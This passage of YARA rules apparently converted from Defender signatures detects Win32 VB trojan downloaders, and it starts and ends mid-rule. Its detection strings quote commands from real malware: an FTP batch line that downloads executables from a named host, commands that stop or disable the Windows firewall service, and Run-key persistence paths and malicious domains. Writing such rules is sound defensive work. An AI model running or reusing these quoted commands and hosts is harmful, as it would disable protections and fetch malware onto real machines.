        $x_1_4 = "WINDOWS\\orkut.exe" wide //weight: 1
        $x_1_5 = "WINDOWS\\process.exe" wide //weight: 1
        $x_1_6 = "WINDOWS\\msn.exe" wide //weight: 1
        $x_1_7 = "WINDOWS\\pegaid.exe" wide //weight: 1
        $x_10_8 = "URLDownloadToFileA" ascii //weight: 10
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_20_*) and 1 of ($x_10_*) and 1 of ($x_1_*))) or
            ((1 of ($x_20_*) and 2 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_Win32_VB_LK_2147613239_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.LK"
        threat_id = "2147613239"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "13"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {4e 7d 8f 5c 00 66 00 73 00 72 00 2e 00 76 00 62 00 70}  //weight: 10, accuracy: High
        $x_1_2 = "ShellExecuteA" ascii //weight: 1
        $x_1_3 = {2f 00 78 00 69 00 61 00 [0-4] 2e 00 65 00 78 00 65 00}  //weight: 1, accuracy: Low
        $x_1_4 = "cmd.exe /c date" wide //weight: 1
        $x_1_5 = "URLDownloadToFileA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 3 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_Win32_VB_CJ_2147615624_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.CJ"
        threat_id = "2147615624"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "60"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = "VB5!6&vb6chs.dll" ascii //weight: 10
        $x_10_2 = {68 74 74 70 3a 2f 2f [0-32] 2f [0-8] 2e 65 78 65}  //weight: 10, accuracy: Low
        $x_10_3 = "URLDownloadToFileA" ascii //weight: 10
        $x_10_4 = {2e 00 65 00 78 00 65 00 10 00 [0-16] 63 00 3a 00 5c 00}  //weight: 10, accuracy: Low
        $x_10_5 = {2e 00 62 00 61 00 74 00 10 00 [0-16] 63 00 3a 00 5c 00}  //weight: 10, accuracy: Low
        $x_10_6 = "@echo off" wide //weight: 10
        $x_1_7 = "mutouxiazai" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((6 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_Win32_VB_CQ_2147615629_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.CQ"
        threat_id = "2147615629"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "51"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {53 65 74 43 69 70 68 65 72 4b 65 79 53 74 72 69 6e 67 00 00 42 6c 6f 63 6b 45 6e 63 72 79 70 74 00 00 00 00 42 6c 6f 63 6b 44 65 63 72 79 70 74}  //weight: 10, accuracy: High
        $x_10_2 = {42 65 67 69 6e 44 6f 77 6e 4c 6f 61 64 00 00 00 42 65 67 69 6e 53 65 74 75 70}  //weight: 10, accuracy: High
        $x_10_3 = "Tgwang" wide //weight: 10
        $x_10_4 = "AllUserSproFile" wide //weight: 10
        $x_5_5 = "CreateToolhelp32Snapshot" ascii //weight: 5
        $x_5_6 = "RegisterShellHookWindow" ascii //weight: 5
        $x_1_7 = "WriteProcessMemory" ascii //weight: 1
        $x_1_8 = "Microsoft Corporation" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((4 of ($x_10_*) and 2 of ($x_5_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_Win32_VB_IC_2147615795_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.IC"
        threat_id = "2147615795"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "C:\\Program Files\\Microsoft Visual Studio\\VB98\\VB6.OLB" ascii //weight: 1
        $x_1_2 = "2tnetpk" ascii //weight: 1
        $x_1_3 = "URLDownloadToFileA" ascii //weight: 1
        $x_1_4 = {74 00 2e 00 6e 00 65 00 74 00 70 00 6b 00 2e 00 63 00 6e 00 2f 00 73 00 6f 00 66 00 74 00 2f 00 31 00 2f 00 [0-2] 2e 00 65 00 78 00 65 00}  //weight: 1, accuracy: Low
        $x_1_5 = {5c 00 73 00 79 00 73 00 74 00 65 00 6d 00 33 00 32 00 5c 00 61 00 62 00 35 00 [0-4] 2e 00 65 00 78 00 65 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_XL_2147616346_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.XL"
        threat_id = "2147616346"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "12"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "C:\\Dokumente und Einstellungen\\Locos\\Desktop\\Easy Load Private" wide //weight: 10
        $x_1_2 = "Check ur URL" wide //weight: 1
        $x_1_3 = "You can only Download .exe Files!" wide //weight: 1
        $x_1_4 = "Drop.exe" wide //weight: 1
        $x_1_5 = "URLDownloadToFileA" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_Win32_VB_CX_2147616899_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.CX"
        threat_id = "2147616899"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "9"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "mt Download .vbp" wide //weight: 2
        $x_2_2 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" wide //weight: 2
        $x_2_3 = "system32\\smsss.exe" wide //weight: 2
        $x_1_4 = "recv.asp?" wide //weight: 1
        $x_1_5 = "&=vip1&=" wide //weight: 1
        $x_1_6 = "thetasks.asp?action" wide //weight: 1
        $x_1_7 = "&phySer=" wide //weight: 1
        $x_1_8 = "\\\\.\\SMARTVSD" wide //weight: 1
        $x_1_9 = "fuck" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_2_*) and 5 of ($x_1_*))) or
            ((3 of ($x_2_*) and 3 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_Win32_VB_DE_2147617018_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.DE"
        threat_id = "2147617018"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {43 00 6f 00 6d 00 70 00 61 00 6e 00 79 00 4e 00 61 00 6d 00 65 00 [0-4] 6b 00 33 00 34 00 6c 00 75 00 70 00 61 00}  //weight: 2, accuracy: Low
        $x_2_2 = {43 00 3a 00 5c 00 57 00 49 00 4e 00 44 00 4f 00 57 00 53 00 5c 00 73 00 79 00 73 00 74 00 65 00 6d 00 33 00 32 00 5c 00 [0-15] 2e 00 65 00 78 00 65 00 ?? ?? ?? ?? ?? ?? 61 00 6c 00 67 00 63 00 73 00 2e 00 65 00 78 00 65 00}  //weight: 2, accuracy: Low
        $x_2_3 = "\\Clemis-Gay\\Proyecto1.vbp" wide //weight: 2
        $x_1_4 = {55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 41 00}  //weight: 1, accuracy: High
        $x_1_5 = {4c 6f 61 64 45 58 45 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_2_*) and 2 of ($x_1_*))) or
            ((3 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_Win32_VB_EE_2147617581_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.EE"
        threat_id = "2147617581"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "16"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "__vbaLateIdSt" ascii //weight: 10
        $x_3_2 = "Cmd.exe /d /c md Edison&cd Edison&del /f /s /q *.*&echo open supertel.vicp.cc>k.x&echo Muma>>k.x&echo 123>>k.x&Echo mget *.exe" wide //weight: 3
        $x_2_3 = "http://smb.homiez.cn/world/" wide //weight: 2
        $x_1_4 = "020430HelloWorld" ascii //weight: 1
        $x_1_5 = "\\lsass.exe" wide //weight: 1
        $x_1_6 = "Net1 Stop Sharedaccess" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 1 of ($x_3_*) and 3 of ($x_1_*))) or
            ((1 of ($x_10_*) and 1 of ($x_3_*) and 1 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_Win32_VB_DG_2147617768_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.DG"
        threat_id = "2147617768"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Adobe Flash Player" ascii //weight: 1
        $x_1_2 = "URLDownloadToFileA" ascii //weight: 1
        $x_1_3 = "\\LOADER\\Project1.vbp" wide //weight: 1
        $x_1_4 = "/fckeditor/" wide //weight: 1
        $x_1_5 = "Este aplicativo" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_XQ_2147619808_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.XQ"
        threat_id = "2147619808"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {55 55 73 65 65 4d 6f 4b 75 61 69 00}  //weight: 1, accuracy: High
        $x_1_2 = {41 76 61 6e 74 4d 6f 4b 75 61 69 00}  //weight: 1, accuracy: High
        $x_1_3 = {6e 00 65 00 74 00 20 00 73 00 74 00 6f 00 70 00 20 00 73 00 68 00 61 00 72 00 65 00 64 00 61 00 63 00 63 00 65 00 73 00 73 00 74 00 00 00}  //weight: 1, accuracy: High
        $x_1_4 = {50 61 6e 44 75 61 6e 54 69 6d 65 72 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_ZH_2147620193_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.ZH"
        threat_id = "2147620193"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "C:\\Program Files\\Internet Explorer\\IEXPLORE.EXE http://xxx.ads555.com/html/ppfilm9.htm" wide //weight: 1
        $x_1_2 = "sc.exe config SharedAccess start= disabled" wide //weight: 1
        $x_1_3 = "Firewall.bat" wide //weight: 1
        $x_1_4 = "\\ppfilm.exe\" /VERYSILENT /SP- /DIR=" wide //weight: 1
        $x_1_5 = {44 00 3a 00 5c 00 b0 65 fa 5e 87 65 f6 4e 39 59 5c 00 0d 59 f6 4e 20 00 b0 65 fa 5e 87 65 f6 4e 39 59 5c 00 e5 5d 0b 7a 31 00 2e 00 76 00 62 00 70 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_Win32_VB_GN_2147623053_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.GN"
        threat_id = "2147623053"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {13 00 00 00 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 41 00}  //weight: 1, accuracy: High
        $x_1_2 = " goto dloop" wide //weight: 1
        $x_1_3 = "if exist " wide //weight: 1
        $x_1_4 = {6a ff 51 8d 4d cc 33 db 50 51 89 5d e4 89 5d e0 89 5d dc 89 5d cc 89 5d b8 c7 45 bc 08 40 00 00 ff 15 ?? ?? 40 00 8d 55 cc 52 68 08 20 00 00 ff 15 ?? ?? 40 00 89 45 b8 8d 45 b8 8d 4d dc 50 51 ff 15 ?? ?? 40 00 8d 4d cc ff 15 ?? ?? 40 00 8b 55 dc 8b 35 ?? ?? 40 00 53 52 6a 01 ff d6 50 6a 01 8d 45 e4 6a 11 50 6a 01 68 80 00 00 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_GO_2147623105_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.GO"
        threat_id = "2147623105"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".2z0o.net" wide //weight: 1
        $x_1_2 = "ServiceExeName set:" wide //weight: 1
        $x_1_3 = "Logging install with Admin server..." wide //weight: 1
        $x_1_4 = {13 00 00 00 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 41 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_YCF_2147623197_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.YCF"
        threat_id = "2147623197"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "30"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "cmd /c ECHO OPEN 59.39.59.102>%windir%\\help.dll&" wide //weight: 10
        $x_10_2 = "cmd /c ECHO good.exe>>%windir%\\BEGIN.BAT&" wide //weight: 10
        $x_10_3 = {72 00 6f 00 6f 00 74 00 2f 00 63 00 69 00 6d 00 76 00 32 00 00 00 00 00}  //weight: 10, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_YCH_2147624821_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.YCH"
        threat_id = "2147624821"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "21"
        strings_accuracy = "High"
    strings:
        $x_11_1 = "C:\\Program Files\\Internet Explorer\\iexplore.exe http://www.52xdy.com" wide //weight: 11
        $x_10_2 = {41 00 46 00 3a 00 5c 00 11 62 84 76 0b 7a 8f 5e 5c 00 32 00 30 00 30 00 39 00 74 5e 2a 4e ba 4e 48 72 0b 4e 7d 8f 05 80 5c 00 97 66 37 52 51 7f d9 7a 5c 00 e5 5d 0b 7a 31 00 2e 00 76 00 62 00 70 00}  //weight: 10, accuracy: High
        $x_10_3 = {5c 00 41 00 46 00 3a 00 5c 00 11 62 84 76 0b 7a 8f 5e 5c 00 32 00 30 00 30 00 39 00 74 5e 2a 4e ba 4e 48 72 0b 4e 7d 8f 05 80 5c 00 af 7e 39 5f 97 7a 5c 00 e5 5d 0b 7a 31 00 2e 00 76 00 62 00 70 00}  //weight: 10, accuracy: High
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_11_*) and 1 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_Win32_VB_HH_2147625222_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.HH"
        threat_id = "2147625222"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {53 00 4f 00 46 00 54 00 57 00 41 00 52 00 45 00 5c 00 4d 00 69 00 63 00 72 00 6f 00 73 00 6f 00 66 00 74 00 5c 00 57 00 69 00 6e 00 64 00 6f 00 77 00 73 00 5c 00 43 00 75 00 72 00 72 00 65 00 6e 00 74 00 56 00 65 00 72 00 73 00 69 00 6f 00 6e 00 5c 00 70 00 6f 00 6c 00 69 00 63 00 69 00 65 00 73 00 5c 00 65 00 78 00 70 00 6c 00 6f 00 72 00 65 00 72 00 5c 00 72 00 75 00 6e 00 00 00 06 00 00 00 6d 00 65 00 6d 00 00 00 0e 00 00 00 5c 00 30 00 31 00 2e 00 65 00 78 00 65 00 00 00}  //weight: 1, accuracy: High
        $x_1_2 = {6d 6f 64 45 6e 63 72 79 70 74 00 00 6d 6f 64 41 50 49 00 00 6d 6f 64 4d 61 69 6e 00 6d 6f 64 53 61 6e 64 62 6f 78 00 00 73 74 75 62 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_HV_2147627530_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.HV"
        threat_id = "2147627530"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {68 00 74 00 74 00 70 00 3a 00 2f 00 2f 00 77 00 77 00 77 00 2e 00 66 00 66 00 2d 00 70 00 75 00 72 00 6b 00 2e 00 61 00 74 00 2f 00 ?? ?? 2e 00 6a 00 70 00 67 00}  //weight: 1, accuracy: Low
        $x_1_2 = "hotmaillive.dll" wide //weight: 1
        $x_1_3 = "hotmail.dll" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_IJ_2147628485_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.IJ"
        threat_id = "2147628485"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Wscript.shell" wide //weight: 1
        $x_1_2 = {77 00 73 00 2e 00 72 00 75 00 6e 00 20 00 22 00 43 00 3a 00 5c 00 57 00 49 00 4e 00 44 00 4f 00 57 00 53 00 5c 00 [0-16] 5c 00 31 00 2e 00 65 00 78 00 65 00 22 00}  //weight: 1, accuracy: Low
        $x_1_3 = {69 00 65 00 78 00 70 00 6c 00 6f 00 72 00 65 00 2e 00 65 00 78 00 65 00 20 00 68 00 74 00 74 00 70 00 3a 00 2f 00 2f 00 [0-48] 2e 00 61 00 73 00 70 00 3f 00 61 00 63 00 74 00 69 00 6f 00 6e 00 3d 00 69 00 6e 00 73 00 74 00 61 00 6c 00 6c 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_A_2147628645_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.gen!A"
        threat_id = "2147628645"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        info = "gen: malware that is detected using a generic signature"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".com.br/" wide //weight: 1
        $x_1_2 = {2e 00 72 00 75 00 2f 00 [0-64] 2e 00 65 00 78 00 65 00 00 00}  //weight: 1, accuracy: Low
        $x_1_3 = {00 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 41 00}  //weight: 1, accuracy: High
        $x_1_4 = {00 5f 5f 76 62 61 46 72 65 65 56 61 72 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_JK_2147630729_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.JK"
        threat_id = "2147630729"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "60"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "www.spyarchive.com" ascii //weight: 10
        $x_10_2 = "www.ntrojan.somee.com" ascii //weight: 10
        $x_10_3 = "sayac" ascii //weight: 10
        $x_10_4 = "pcversiyonyukselt" ascii //weight: 10
        $x_10_5 = "pcversiounbul" ascii //weight: 10
        $x_10_6 = "yenisi bulundu" wide //weight: 10
        $x_10_7 = {53 00 4f 00 46 00 54 00 57 00 41 00 52 00 45 00 5c 00 4d 00 49 00 43 00 52 00 4f 00 53 00 4f 00 46 00 54 00 5c 00 57 00 49 00 4e 00 44 00 4f 00 57 00 53 00 5c 00 43 00 55 00 52 00 52 00 45 00 4e 00 54 00 56 00 45 00 52 00 53 00 49 00 4f 00 4e 00 5c 00 52 00 75 00 6e 00 5c 00 00 00 00 00 30 00 00 00 53 00 79 00 73 00 74 00 65 00 6d 00 5f 00 53 00 65 00 63 00 75 00 72 00 69 00 74 00 79 00 5f 00 53 00 65 00 72 00 76 00 69 00 63 00 65 00 73 00}  //weight: 10, accuracy: High
        $x_10_8 = "kacsnsonra.txt" wide //weight: 10
    condition:
        (filesize < 20MB) and
        (6 of ($x*))
}

rule TrojanDownloader_Win32_VB_JL_2147630769_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.JL"
        threat_id = "2147630769"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "URLDownloadToFileA" ascii //weight: 1
        $x_1_2 = {68 00 74 00 74 00 70 00 3a 00 2f 00 2f 00 [0-160] 2e 00 65 00 78 00 65 00 00}  //weight: 1, accuracy: Low
        $x_1_3 = "cmd /c attrib +s +h C:\\Windows" wide //weight: 1
        $x_1_4 = "autorun" wide //weight: 1
        $x_1_5 = "C:\\WINDOWS.EXE" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_LL_2147632521_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.LL"
        threat_id = "2147632521"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "modOpenURL" ascii //weight: 1
        $x_1_2 = "Gusanito" ascii //weight: 1
        $x_1_3 = "chkAutomatico" ascii //weight: 1
        $x_1_4 = "phar" ascii //weight: 1
        $x_1_5 = "URLDownloadToFileA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_LN_2147632967_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.LN"
        threat_id = "2147632967"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {74 00 61 00 73 00 6b 00 6b 00 69 00 6c 00 6c 00 2e 00 65 00 78 00 65 00 20 00 2f 00 69 00 6d 00 20 00 [0-32] 2e 00 65 00 78 00 65 00 20 00 2f 00 66 00}  //weight: 1, accuracy: Low
        $x_1_2 = {64 00 6f 00 63 00 75 00 6d 00 65 00 6e 00 74 00 45 00 6c 00 65 00 6d 00 65 00 6e 00 74 00 00 00 69 00 6e 00 6e 00 65 00 72 00 48 00 54 00 4d 00 4c 00}  //weight: 1, accuracy: High
        $x_1_3 = {3c 00 73 00 63 00 72 00 69 00 70 00 74 00 20 00 6c 00 61 00 6e 00 67 00 75 00 61 00 67 00 65 00 3d 00 00 00 26 00 00 00 4a 00 61 00 76 00 61 00 73 00 63 00 72 00 69 00 70 00 74 00 3e 00 64 00 6f 00 63 00 75 00 6d 00 65 00 6e 00 74 00}  //weight: 1, accuracy: High
        $x_1_4 = "window.showModalDialog=null;" wide //weight: 1
        $x_1_5 = "wscript.shell" wide //weight: 1
        $x_1_6 = "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run]" wide //weight: 1
        $x_1_7 = "ws.run" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_LP_2147633032_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.LP"
        threat_id = "2147633032"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {68 00 74 00 74 00 70 00 3a 00 2f 00 2f 00 2f 00 00 00}  //weight: 1, accuracy: High
        $x_1_2 = {65 58 74 72 61 6c 6f 31 00 ff 15 00 53 48 44 6f 63 56 77 43 74 6c 2e 57 65 62 42 72 6f 77 73 65 72 00}  //weight: 1, accuracy: High
        $x_1_3 = {75 68 72 6e 62 62 6d 34 37 65 68 69 36 79 6c 7a 70 76 68 71 6b 38 79 33 67 36 6b 61 31 36 31 31 78 30 34 6e 6b 77 72 37 69 6c 66 39 6b 38 6a 38 79 63 00}  //weight: 1, accuracy: High
        $x_1_4 = {61 7a 35 69 36 35 39 74 6b 39 62 70 70 6c 78 74 73 6a 76 36 72 7a 71 33 6d 6e 33 63 36 37 66 6d 6a 72 77 79 6b 73 71 74 78 7a 66 37 75 6c 73 76 74 77 00}  //weight: 1, accuracy: High
        $x_1_5 = {67 32 36 70 33 70 6f 70 6a 36 36 34 7a 39 79 6e 6e 68 6e 69 6e 77 30 39 77 34 32 32 61 71 34 63 36 33 6c 69 79 31 31 76 61 33 73 79 34 76 34 33 79 74 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_Win32_VB_XO_2147634350_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.XO"
        threat_id = "2147634350"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ftp.58888.net/mm.exe" wide //weight: 1
        $x_1_2 = "58888.net/rjshengji/rjxiazai.txt" wide //weight: 1
        $x_1_3 = "c:\\windows\\rjqing.cj" wide //weight: 1
        $x_1_4 = "del zcy_copy_ziji.bat" wide //weight: 1
        $x_1_5 = "C:\\SYS\\SP00LSV.exe" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_Win32_VB_XP_2147634383_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.XP"
        threat_id = "2147634383"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "painweb.net/ch/" wide //weight: 1
        $x_1_2 = "painweb.net/ht/" wide //weight: 1
        $x_1_3 = "C:\\Program Files\\Internet Explorer\\m2.da" wide //weight: 1
        $x_1_4 = ".gomowieop.com" wide //weight: 1
        $x_1_5 = ".gombaihop.com" wide //weight: 1
        $x_1_6 = "goushi" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_Win32_VB_XV_2147634384_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.XV"
        threat_id = "2147634384"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "bdskw.cn" wide //weight: 1
